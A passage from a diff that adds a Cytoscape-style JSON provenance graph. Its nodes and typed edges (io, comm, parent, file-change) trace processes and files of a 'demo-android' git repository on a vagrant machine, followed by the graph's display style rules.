+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:d4d555b6-50ac-e95b-ac50-79576be94d9c",
+          "label": "/usr/home/vagrant/.gitme/././demo-android/.git/description"
+        },
+        "position": {
+          "x": 4234.6640963963855,
+          "y": 1955.2431358356719
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "hostname": [
+            "git.bovia.org"
+          ],
+          "id": "370876",
+          "names": [
+            "/usr/home/vagrant/./demo-android/README.md"
+          ],
+          "parent": "369448",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10:069a5cdc-c0fa-eb51-bac0-d67101eb7b62",
+          "label": "/usr/home/vagrant/./demo-android/README.md"
+        },
+        "position": {
+          "x": 5034.22695940081,
+          "y": 1315.0208784869885
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      }
+    ],
+    "edges": [
+      {
+        "data": {
+          "id": "720852",
+          "source": "369742",
+          "state": null,
+          "target": "369616",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "720851",
+          "source": "369612",
+          "state": null,
+          "target": "369742",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "720849",
+          "source": "367741",
+          "state": null,
+          "target": "369448",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "716985",
+          "source": "368251",
+          "state": null,
+          "target": "368274",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "720565",
+          "source": "369614",
+          "state": [
+            "SERVER",
+            "READ",
+            "WRITE"
+          ],
+          "target": "369616",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "720566",
+          "source": "369614",
+          "state": null,
+          "target": "369617",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "721145",
+          "source": "369855",
+          "state": null,
+          "target": "369877",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "721101",
+          "source": "369617",
+          "state": null,
+          "target": "369855",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "721196",
+          "source": "369877",
+          "state": null,
+          "target": "369899",
+          "type": "proc-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "proc-change"
+      },
+      {
+        "data": {
+          "id": "720559",
+          "source": "369570",
+          "state": [
+            "CLIENT",
+            "READ",
+            "WRITE"
+          ],
+          "target": "369612",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "720449",
+          "source": "369541",
+          "state": null,
+          "target": "369570",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "720372",
+          "source": "368739",
+          "state": null,
+          "target": "369541",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "718230",
+          "source": "368723",
+          "state": null,
+          "target": "368739",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "718186",
+          "source": "368274",
+          "state": null,
+          "target": "368723",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "716971",
+          "source": "368251",
+          "state": null,
+          "target": "368269",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "716592",
+          "source": "367959",
+          "state": null,
+          "target": "368116",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "715753",
+          "source": "367742",
+          "state": null,
+          "target": "367745",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "715750",
+          "source": "367743",
+          "state": null,
+          "target": "367741",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "735487",
+          "source": "367744",
+          "state": null,
+          "target": "367743",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "716644",
+          "source": "368116",
+          "state": null,
+          "target": "368137",
+          "type": "proc-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "proc-change"
+      },
+      {
+        "data": {
+          "id": "716800",
+          "source": "367959",
+          "state": null,
+          "target": "368201",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "716712",
+          "source": "368137",
+          "state": [
+            "WRITE"
+          ],
+          "target": "368164",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "716221",
+          "source": "367745",
+          "state": null,
+          "target": "367959",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "718142",
+          "source": "368629",
+          "state": [
+            "WRITE"
+          ],
+          "target": "368706",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "717439",
+          "source": "367741",
+          "state": null,
+          "target": "368449",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "737154",
+          "source": "368705",
+          "state": null,
+          "target": "368449",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "717929",
+          "source": "368274",
+          "state": null,
+          "target": "368629",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "715752",
+          "source": "367742",
+          "state": [
+            "SERVER",
+            "READ",
+            "WRITE"
+          ],
+          "target": "367744",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "717461",
+          "source": "368274",
+          "state": null,
+          "target": "368459",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "717246",
+          "source": "368274",
+          "state": null,
+          "target": "368373",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "718140",
+          "source": "368629",
+          "state": [
+            "CLIENT",
+            "READ",
+            "WRITE"
+          ],
+          "target": "368705",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "718849",
+          "source": "368972",
+          "state": [
+            "READ"
+          ],
+          "target": "368880",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "718350",
+          "source": "368755",
+          "state": null,
+          "target": "368784",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "720173",
+          "source": "369072",
+          "state": null,
+          "target": "369466",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "717442",
+          "source": "368373",
+          "state": [
+            "WRITE"
+          ],
+          "target": "368451",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "717443",
+          "source": "368451",
+          "state": null,
+          "target": "368452",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "718781",
+          "source": "368909",
+          "state": [
+            "CLIENT",
+            "READ",
+            "WRITE"
+          ],
+          "target": "368947",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "717440",
+          "source": "368373",
+          "state": [
+            "CLIENT",
+            "READ",
+            "WRITE"
+          ],
+          "target": "368450",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "736899",
+          "source": "368450",
+          "state": null,
+          "target": "368449",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "718143",
+          "source": "368706",
+          "state": null,
+          "target": "368707",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "718430",
+          "source": "368707",
+          "state": null,
+          "target": "368814",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "718431",
+          "source": "368814",
+          "state": [
+            "READ"
+          ],
+          "target": "368784",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "718433",
+          "source": "368814",
+          "state": null,
+          "target": "368815",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "718879",
+          "source": "368739",
+          "state": null,
+          "target": "368983",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "737809",
+          "source": "369360",
+          "state": null,
+          "target": "368449",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "718266",
+          "source": "368752",
+          "state": [
+            "READ"
+          ],
+          "target": "368739",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "716924",
+          "source": "368165",
+          "state": null,
+          "target": "368252",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "720177",
+          "source": "369467",
+          "state": [
+            "READ"
+          ],
+          "target": "369293",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "718678",
+          "source": "368880",
+          "state": null,
+          "target": "368909",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "719106",
+          "source": "369071",
+          "state": null,
+          "target": "369072",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "716714",
+          "source": "368164",
+          "state": null,
+          "target": "368165",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "719728",
+          "source": "368739",
+          "state": null,
+          "target": "369293",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "718759",
+          "source": "368815",
+          "state": null,
+          "target": "368939",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "718762",
+          "source": "368939",
+          "state": null,
+          "target": "368940",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "719487",
+          "source": "368739",
+          "state": null,
+          "target": "369210",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "718221",
+          "source": "368452",
+          "state": null,
+          "target": "368736",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "719497",
+          "source": "369210",
+          "state": null,
+          "target": "369213",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "717674",
+          "source": "368459",
+          "state": [
+            "WRITE"
+          ],
+          "target": "368536",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "718760",
+          "source": "368939",
+          "state": [
+            "READ"
+          ],
+          "target": "368909",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "716925",
+          "source": "368252",
+          "state": [
+            "READ"
+          ],
+          "target": "368251",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "717675",
+          "source": "368536",
+          "state": null,
+          "target": "368537",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "719886",
+          "source": "368940",
+          "state": null,
+          "target": "369352",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "717673",
+          "source": "368459",
+          "state": [
+            "CLIENT",
+            "READ",
+            "WRITE"
+          ],
+          "target": "368535",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "718273",
+          "source": "368739",
+          "state": null,
+          "target": "368755",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "718265",
+          "source": "368537",
+          "state": null,
+          "target": "368752",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "736984",
+          "source": "368535",
+          "state": null,
+          "target": "368449",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "716856",
+          "source": "368201",
+          "state": null,
+          "target": "368224",
+          "type": "proc-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "proc-change"
+      },
+      {
+        "data": {
+          "id": "719105",
+          "source": "369071",
+          "state": [
+            "READ"
+          ],
+          "target": "368986",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "719908",
+          "source": "369322",
+          "state": [
+            "CLIENT",
+            "READ",
+            "WRITE"
+          ],
+          "target": "369360",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "719805",
+          "source": "369293",
+          "state": null,
+          "target": "369322",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "719887",
+          "source": "369352",
+          "state": [
+            "READ"
+          ],
+          "target": "369322",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "718601",
+          "source": "368739",
+          "state": null,
+          "target": "368880",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "718451",
+          "source": "368784",
+          "state": [
+            "CLIENT",
+            "READ",
+            "WRITE"
+          ],
+          "target": "368822",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "737271",
+          "source": "368822",
+          "state": null,
+          "target": "368449",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "737396",
+          "source": "368947",
+          "state": null,
+          "target": "368449",
+          "type": "comm"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "comm"
+      },
+      {
+        "data": {
+          "id": "718889",
+          "source": "368983",
+          "state": null,
+          "target": "368986",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "720176",
+          "source": "369466",
+          "state": null,
+          "target": "369467",
+          "type": "file-change"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-change"
+      },
+      {
+        "data": {
+          "id": "720174",
+          "source": "369466",
+          "state": [
+            "READ"
+          ],
+          "target": "369293",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "718223",
+          "source": "368736",
+          "state": [
+            "READ"
+          ],
+          "target": "368723",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "716922",
+          "source": "368224",
+          "state": null,
+          "target": "368251",
+          "type": "parent"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "parent"
+      },
+      {
+        "data": {
+          "id": "722349",
+          "source": "370408",
+          "state": [
+            "READ"
+          ],
+          "target": "369899",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "722764",
+          "source": "370592",
+          "state": [
+            "READ"
+          ],
+          "target": "369899",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "722350",
+          "source": "369541",
+          "state": [
+            "WRITE"
+          ],
+          "target": "370409",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "720288",
+          "source": "369510",
+          "state": [
+            "READ"
+          ],
+          "target": "369293",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "723135",
+          "source": "369541",
+          "state": [
+            "WRITE"
+          ],
+          "target": "370759",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      },
+      {
+        "data": {
+          "id": "723406",
+          "source": "370876",
+          "state": [
+            "READ"
+          ],
+          "target": "369899",
+          "type": "io"
+        },
+        "position": {},
+        "group": "edges",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "io"
+      }
+    ]
+  },
+  "style": [
+    {
+      "selector": "core",
+      "style": {
+        "active-bg-color": "#333"
+      }
+    },
+    {
+      "selector": "edge",
+      "style": {
+        "curve-style": "bezier",
+        "font-family": "Avenir, Helvetica Neue, Helvetica, sans-serif",
+        "target-arrow-shape": "triangle",
+        "width": "4px",
+        "text-halign": "center",
+        "text-valign": "center",
+        "text-outline-width": "2px",
+        "color": "white"
+      }
+    },
+    {
+      "selector": "edge.parent",
+      "style": {
+        "line-style": "dotted",
+        "width": "8px",
+        "target-arrow-color": "#366",
+        "line-color": "#366",
+        "text-outline-color": "#366"
+      }
+    },
+    {
+      "selector": "edge.file-change",
+      "style": {
+        "line-style": "dotted",
+        "target-arrow-color": "#633",
+        "line-color": "#633",
+        "text-outline-color": "#633"
+      }
+    },
+    {
+      "selector": "edge.io",
+      "style": {
+        "target-arrow-color": "#633",
+        "line-color": "#633",
+        "text-outline-color": "#633"
+      }
+    },
+    {
+      "selector": "edge.comm",
+      "style": {
+        "line-style": "dashed",
+        "target-arrow-color": "#633",
+        "line-color": "#633",
+        "text-outline-color": "#633"
+      }
+    },
+    {
+      "selector": "edge.proc-change",
+      "style": {
+        "line-style": "dashed",
+        "target-arrow-color": "#366",
+        "line-color": "#366",
+        "text-outline-color": "#366"
+      }
+    },
+    {
+      "selector": "edge.proc-metadata",
+      "style": {
+        "line-style": "dotted",
+        "target-arrow-color": "#366",
+        "line-color": "#366",
+        "text-outline-color": "#366"
+      }
+    },
+    {
+      "selector": "node",
+      "style": {
+        "label": "data(label)",
+        "font-family": "Avenir, Helvetica Neue, Helvetica, sans-serif",
+        "border-style": "solid",
+        "border-width": "2px",
+        "color": "black",
+        "text-background-color": "#eee",
+        "text-background-opacity": "0.75",
+        "text-background-padding": "0.25em",
+        "text-halign": "center",
+        "text-valign": "bottom",
+        "text-outline-width": "0px",
+        "text-wrap": "wrap",
+        "text-max-width": "10em",
+        "height": "4em",
+        "width": "4em",
+        "background-fit": "contain",
+        "background-position-x": "0",
+        "background-position-y": "0"
+      }
+    },
+    {
+      "selector": "node:selected",
+      "style": {
+        "overlay-color": "#333",
+        "overlay-padding": "10px",
+        "overlay-opacity": "0.25"
+      }
+    },
+    {
+      "selector": "node.connection",
+      "style": {
+        "shape": "rectangle",
+        "background-image": "static/images/connection.png",
+        "background-color": "white",
+        "text-background-opacity": "0"
+      }
+    },
+    {
+      "selector": "node.process",
+      "style": {
+        "shape": "ellipse",
+        "background-color": "#333",
+        "background-image": "static/images/proc.png",
+        "border-color": "#333",
+        "font-family": "Inconsolata, Source Code Pro, Consolas, monospace"
+      }
+    },
+    {
+      "selector": "node.file-version",
+      "style": {
+        "shape": "rectangle",
+        "background-image": "static/images/file-version.png",
+        "background-opacity": "0",
+        "border-width": "0px"
+      }
+    },
+    {
+      "selector": "node.machine",
+      "style": {
+        "font-size": "24",
+        "text-halign": "center",
+        "text-valign": "top",
+        "text-margin-y": "0.25em",
+        "shape": "rectangle",
+        "padding": "1em",
+        "min-width": "160px",
